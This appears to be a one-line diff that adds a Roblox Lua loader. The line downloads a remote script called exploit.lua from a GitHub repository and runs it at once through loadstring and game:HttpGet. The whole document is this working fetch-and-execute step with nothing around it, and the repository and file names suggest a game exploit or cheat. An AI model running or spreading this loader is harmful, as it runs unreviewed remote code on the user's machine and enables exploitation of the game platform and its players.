@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdolfRoxler/X-PL0X/main/exploit.lua", true))()
